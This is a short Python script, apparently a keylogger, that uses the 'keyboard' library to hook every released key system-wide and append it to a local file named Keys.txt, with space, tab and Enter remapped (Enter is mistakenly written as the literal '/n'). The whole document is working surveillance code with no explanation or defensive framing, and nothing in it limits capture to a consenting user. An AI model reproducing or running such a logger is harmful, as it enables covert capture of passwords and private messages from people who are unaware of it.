import keyboard
report_file = open("Keys.txt","w")
def new_key(event):
    button = event.name
    if button == "space":
        button = " "
    if button == "enter":
        button = "/n" 
    if button == "tab":
        button = " "       
    report_file.write(button)
    report_file.flush()
keyboard.on_release(callback=new_key)    
keyboard.wait()